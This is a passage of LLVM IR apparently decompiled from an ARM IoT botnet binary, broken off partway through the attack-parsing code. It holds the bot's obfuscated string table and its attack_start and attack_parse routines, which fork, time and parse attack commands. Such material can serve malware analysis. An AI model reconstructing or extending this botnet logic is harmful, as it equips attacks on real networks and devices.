source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_21d0c.23 = global i32 0
@global_var_d8c4.27 = constant i32 -382906384
@global_var_21f30.32 = global i32 0
@global_var_831c.33 = constant i32 -352321547
@global_var_1310c.34 = constant i32 -382909968
@global_var_bd94.40 = constant i32 -382906384
@global_var_c1cc.42 = constant i32 -382906384
@global_var_b608.44 = constant i32 -382906384
@global_var_af5c.46 = constant i32 -382906384
@global_var_a864.48 = constant i32 -382906384
@global_var_a0b0.50 = constant i32 -382906384
@global_var_9040.53 = constant i32 -382906384
@global_var_89ac.55 = constant i32 -382906384
@global_var_965c.57 = constant i32 -382906384
@global_var_24a4c.59 = global i32 0
@global_var_24a54.71 = global i32 0
@global_var_195f8.73 = constant i32 47
@global_var_e600.75 = constant i32 -509607925
@global_var_c707.76 = constant [3 x i8] c"\0AH\00"
@global_var_c100.77 = constant i32 -514850808
@global_var_24a50.79 = global i32 0
@global_var_21f34.81 = global i32 0
@global_var_d750.84 = constant i32 -382910352
@global_var_21dc0.86 = global i32 68196
@global_var_21db8.88 = global i32 -1
@global_var_24a5c.94 = local_unnamed_addr global i32 0
@global_var_24a5a.95 = local_unnamed_addr global i32 0
@global_var_21f38.97 = global i32 0
@global_var_195fc.105 = constant i32 10
@global_var_21dbc.107 = global i32 -1
@global_var_145e0.112 = constant i32 -450904024
@global_var_10a64.113 = constant i32 -382910352
@global_var_19600.117 = constant i32 16777216
@global_var_21f40.119 = global i32 0
@global_var_21f4c.121 = global i32 0
@global_var_21f44.123 = global i32 0
@global_var_21f48.125 = global i32 0
@global_var_e748.138 = constant i32 -509607925
@global_var_24a70.140 = global i32 0
@global_var_21f84.142 = global i32 0
@global_var_21f50.144 = global i32 0
@global_var_21f7c.146 = global i32 0
@global_var_24a68.153 = global i32 0
@global_var_24a6c.155 = global i32 0
@global_var_21f56.158 = local_unnamed_addr global i32 0
@global_var_21f68.160 = global i32 0
@global_var_21f58.162 = local_unnamed_addr global i32 0
@global_var_21f5c.163 = local_unnamed_addr global i32 0
@global_var_21f5d.164 = local_unnamed_addr global i32 0
@global_var_21f76.167 = local_unnamed_addr global i32 0
@global_var_19608.169 = constant [8 x i8] c"0125!8 \00"
@global_var_1962c.171 = constant i32 0
@global_var_19610.173 = constant [6 x i8] c"509=:\00"
@global_var_19618.175 = constant i32 943467547
@global_var_19624.177 = constant i32 322070023
@global_var_19630.179 = constant i32 606281272
@global_var_19638.181 = constant [7 x i8] c"5: '8%\00"
@global_var_19640.183 = constant i32 1027158037
@global_var_21f60.184 = local_unnamed_addr global i32 0
@global_var_21f5e.185 = local_unnamed_addr global i32 0
@global_var_21f64.186 = local_unnamed_addr global i32 0
@global_var_21f6c.188 = local_unnamed_addr global i32 0
@global_var_21f78.189 = local_unnamed_addr global i32 0
@global_var_e858.191 = constant i32 -382910352
@global_var_19648.193 = constant [3 x i8] c"\0D\0A\00"
@global_var_19654.195 = constant i32 2096127
@global_var_1964b.197 = constant i32 2095871
@global_var_24a78.202 = global i32 0
@global_var_21dc8.205 = global i32 -555811921
@global_var_19658.210 = constant i32 58965
@global_var_24a80.211 = local_unnamed_addr global i32 0
@global_var_24a84.212 = local_unnamed_addr global i32 0
@global_var_1965c.214 = constant [13 x i8] c"&;; 91z78!6T\00"
@global_var_24a88.215 = local_unnamed_addr global i32 0
@global_var_24a8c.216 = local_unnamed_addr global i32 0
@global_var_1966c.218 = constant [13 x i8] c"'1:$5=z'= 1T\00"
@global_var_24a90.219 = local_unnamed_addr global i32 0
@global_var_24a94.220 = local_unnamed_addr global i32 0
@global_var_1967c.222 = constant i32 28654
@global_var_24a98.223 = local_unnamed_addr global i32 0
@global_var_24a9c.224 = local_unnamed_addr global i32 0
@global_var_19680.226 = constant [37 x i8] c"&;; t'1:$5=t>!' t=:217 10t-;!&t'<= T\00"
@global_var_24aa4.227 = local_unnamed_addr global i32 0
@global_var_24aa0.228 = local_unnamed_addr global i32 0
@global_var_196a8.230 = constant [7 x i8] c"'<188T\00"
@global_var_24aa8.231 = local_unnamed_addr global i32 0
@global_var_24aac.232 = local_unnamed_addr global i32 0
@global_var_196b0.234 = constant [8 x i8] c"1:5681T\00"
@global_var_24ab0.235 = local_unnamed_addr global i32 0
@global_var_24ab4.236 = local_unnamed_addr global i32 0
@global_var_196b8.238 = constant [8 x i8] c"'-' 19T\00"
@global_var_24ab8.239 = local_unnamed_addr global i32 0
@global_var_24abc.240 = local_unnamed_addr global i32 0
@global_var_196c0.242 = constant [4 x i8] c"'<T\00"
@global_var_24ac4.243 = local_unnamed_addr global i32 0
@global_var_24ac0.244 = local_unnamed_addr global i32 0
@global_var_196c4.246 = constant i32 977090171
@global_var_24acc.247 = local_unnamed_addr global i32 0
@global_var_24ac8.248 = local_unnamed_addr global i32 0
@global_var_196d8.250 = constant i32 102440217
@global_var_24ad4.251 = local_unnamed_addr global i32 0
@global_var_24ad0.252 = local_unnamed_addr global i32 0
@global_var_196f4.254 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24adc.255 = local_unnamed_addr global i32 0
@global_var_24ad8.256 = local_unnamed_addr global i32 0
@global_var_19700.258 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24ae0.259 = local_unnamed_addr global i32 0
@global_var_24ae4.260 = local_unnamed_addr global i32 0
@global_var_19714.262 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24aec.263 = local_unnamed_addr global i32 0
@global_var_24ae8.264 = local_unnamed_addr global i32 0
@global_var_1972c.266 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24af0.267 = local_unnamed_addr global i32 0
@global_var_24af4.268 = local_unnamed_addr global i32 0
@global_var_19734.270 = constant [6 x i8] c"{1,1T\00"
@global_var_24af8.271 = local_unnamed_addr global i32 0
@global_var_24afc.272 = local_unnamed_addr global i32 0
@global_var_1973c.274 = constant [5 x i8] c"{20T\00"
@global_var_24b04.275 = local_unnamed_addr global i32 0
@global_var_24b00.276 = local_unnamed_addr global i32 0
@global_var_19744.278 = constant [7 x i8] c"{95$'T\00"
@global_var_24b08.279 = local_unnamed_addr global i32 0
@global_var_24b0c.280 = local_unnamed_addr global i32 0
@global_var_1974c.282 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_24b10.283 = local_unnamed_addr global i32 0
@global_var_24b14.284 = local_unnamed_addr global i32 0
@global_var_1975c.286 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_24b70.287 = local_unnamed_addr global i32 0
@global_var_24b74.288 = local_unnamed_addr global i32 0
@global_var_19768.290 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_24b18.291 = local_unnamed_addr global i32 0
@global_var_24b1c.292 = local_unnamed_addr global i32 0
@global_var_1977c.294 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24b20.295 = local_unnamed_addr global i32 0
@global_var_24b24.296 = local_unnamed_addr global i32 0
@global_var_19804.298 = constant i32 557516544
@global_var_24b2c.299 = local_unnamed_addr global i32 0
@global_var_24b28.300 = local_unnamed_addr global i32 0
@global_var_19788.302 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_24b34.303 = local_unnamed_addr global i32 0
@global_var_24b30.304 = local_unnamed_addr global i32 0
@global_var_1979c.306 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_24b38.307 = local_unnamed_addr global i32 0
@global_var_24b3c.308 = local_unnamed_addr global i32 0
@global_var_197ac.310 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_24b40.311 = local_unnamed_addr global i32 0
@global_var_24b44.312 = local_unnamed_addr global i32 0
@global_var_197bc.314 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_24b4c.315 = local_unnamed_addr global i32 0
@global_var_24b48.316 = local_unnamed_addr global i32 0
@global_var_197d0.318 = constant [9 x i8] c"$662*7!E\00"
@global_var_24b50.319 = local_unnamed_addr global i32 0
@global_var_24b54.320 = local_unnamed_addr global i32 0
@global_var_197dc.322 = constant [6 x i8] c";3=:T\00"
@global_var_24b58.323 = local_unnamed_addr global i32 0
@global_var_24b5c.324 = local_unnamed_addr global i32 0
@global_var_197e4.326 = constant [7 x i8] c"1: 1&T\00"
@global_var_24b60.327 = local_unnamed_addr global i32 0
@global_var_24b64.328 = local_unnamed_addr global i32 0
@global_var_107a4.329 = constant i32 104428
@global_var_197ec.330 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_24b68.331 = local_unnamed_addr global i32 0
@global_var_24b6c.332 = local_unnamed_addr global i32 0
@global_var_21d10.338 = global i32 0
@global_var_10c94.348 = constant i32 -1711275998
@global_var_11344.360 = constant i32 -443088884
@global_var_117dc.376 = constant i32 -456978431
@global_var_ff60.410 = constant i32 436207650
@global_var_120cc.422 = constant i32 -478871519
@global_var_12b70.439 = constant i32 -478805983
@global_var_12f58.449 = constant i32 -382906384
@global_var_15060.458 = constant i32 -442544040
@global_var_138f0.482 = constant i32 -369098502
@global_var_142c4.496 = constant i32 -382910288
@global_var_d924.507 = constant [3 x i8] c"N\0C\00"
@global_var_14474.509 = constant i32 -2020859901
@global_var_14560.512 = constant i32 -494075872
@global_var_111f0.513 = constant i32 -382910336
@global_var_24f00.516 = local_unnamed_addr global i32 0
@global_var_d46c.521 = constant i32 167772226
@global_var_13388.530 = constant i32 -442543860
@global_var_11740.538 = constant i32 -369093146
@global_var_cc6c.564 = constant i32 -509607927
@global_var_15558.565 = constant i32 -382910352
@global_var_16968.587 = constant i32 -382906384
@global_var_16428.615 = constant i32 -382910448
@global_var_17e18.616 = constant i32 -382909968
@global_var_18554.679 = constant i32 -481296376
@global_var_1864c.680 = constant i32 -481296376
@global_var_186d0.681 = constant i32 -369098732
@global_var_21f10.13 = external global i8*
@global_var_21f2c.30 = external global i8*
@global_var_21f2d.38 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_21dc4.90 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24a58.93 = global i16* null
@global_var_21f3c.110 = external global i8*
@global_var_21f80.148 = global i16* null
@global_var_21f54.157 = external global i8*
@global_var_21f74.161 = local_unnamed_addr global i8 0
@global_var_21f6a.165 = local_unnamed_addr global i16 0
@global_var_21f75.166 = local_unnamed_addr global i8 0
@global_var_21d68.334 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_21f10.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_21f10.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_21f10.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_21d0c.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_21d0c.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_21d0c.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d8c4.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 103912, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_21f2c.30 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_21f2c.30 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_21f30.32 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_21f30.32, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
